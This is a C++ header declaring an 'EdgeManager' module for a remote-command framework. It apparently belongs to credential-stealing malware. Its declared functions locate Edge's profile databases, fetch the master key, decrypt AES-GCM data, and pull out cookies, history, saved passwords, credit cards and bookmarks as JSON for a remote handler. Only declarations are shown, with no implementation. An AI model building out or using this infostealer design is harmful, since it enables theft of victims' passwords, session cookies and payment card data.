#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <nlohmann/json.hpp>
#include <string>
#include <vector>
#include <memory>
#include <functional>

// Forward declaration
struct sqlite3;

using json = nlohmann::json;

class EdgeManager : public IRemoteModule {
private:
    std::string module_name_ = "EDGE";
    
    // Utility functions
    std::string getAppDataPath();
    std::string getEdgeDatabasePath();
    std::string getLocalStatePath();
    std::vector<unsigned char> getMasterKey();
    
    // Decryption functions
    std::vector<unsigned char> decryptAESGCM(const std::vector<unsigned char>& ciphertext,
                                           const std::vector<unsigned char>& key,
                                           const std::vector<unsigned char>& iv);
    
    // Database helper functions
    bool copyDatabaseFile(const std::string& sourcePath, const std::string& destPath);
    sqlite3* openDatabase(const std::string& path, bool copyFirst = true);
    void closeDatabase(sqlite3* db, const std::string& tempPath = "");
    
    // Data extraction functions
    json extractCookies();
    json extractHistory();
    json extractPasswords();
    json extractCreditCards();
    json extractBookmarks();
    
    // Helper functions
    std::string wideStringToString(const std::wstring& wstr);
    std::wstring stringToWideString(const std::string& str);
    std::vector<unsigned char> base64Decode(const std::string& encoded);
    std::string base64Encode(const unsigned char* data, size_t length);

public:
    EdgeManager() = default;
    ~EdgeManager() = default;
    
    // IRemoteModule implementation
    const std::string& get_module_name() const override {
        return module_name_;
    }
    
    json handle_command(const json& request) override;
    
    // Main extraction function
    json extractEdgeData();
};